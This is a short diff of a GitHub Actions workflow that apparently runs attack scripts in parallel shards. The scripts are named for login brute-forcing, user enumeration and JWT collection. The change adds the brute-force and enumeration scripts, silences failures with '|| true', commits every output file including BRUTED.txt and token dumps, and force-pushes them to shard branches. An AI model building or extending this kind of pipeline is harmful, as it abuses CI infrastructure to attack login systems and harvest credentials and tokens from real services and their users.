@@ -98,8 +98,8 @@ jobs:
           fetch-depth: 0
       - name: sync
         run: |
-          git fetch origin main --quiet
-          git checkout origin/main -- sp_probe.py jwt_collect.py 2>/dev/null || true
+          git fetch origin main --quiet || true
+          git checkout origin/main -- sp_probe.py jwt_collect.py login_brute.py user_enum.py 2>/dev/null || true
       - name: run
         run: |
           python3 jwt_collect.py ${{ matrix.shard }} || true
@@ -110,6 +110,6 @@ jobs:
         run: |
           git config user.name proxy
           git config user.email proxy@users.noreply.github.com
-          git add sp_*.jsonl sp_*.txt jwt_*.txt jwt_sample.txt lb_*.txt ue_*.txt BRUTED.txt
+          git add -A
           git diff --cached --quiet || git commit -m "p${{ matrix.shard }}"
           git push --force origin HEAD:refs/heads/shards/sql${{ matrix.shard }} || true
